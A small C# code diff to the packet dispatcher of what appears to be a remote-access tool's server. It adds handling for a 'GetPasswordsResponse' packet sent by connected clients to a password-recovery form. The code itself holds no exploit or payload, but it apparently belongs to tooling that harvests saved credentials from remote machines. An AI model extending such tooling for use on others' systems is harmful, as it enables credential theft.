@@ -63,6 +63,10 @@ namespace Serveur.Packets
             {
                 FrmStartupManagerController.getStartupItemsResponse(client, (GetStartupItemsResponse)packet);
             }
+            else if (type == TypePackets.GetPasswordsResponse)
+            {
+                FrmPasswordRecoveryController.HandleGetPasswordsResponse(client, (GetPasswordsResponse)packet);
+            }
         }
     }
 }
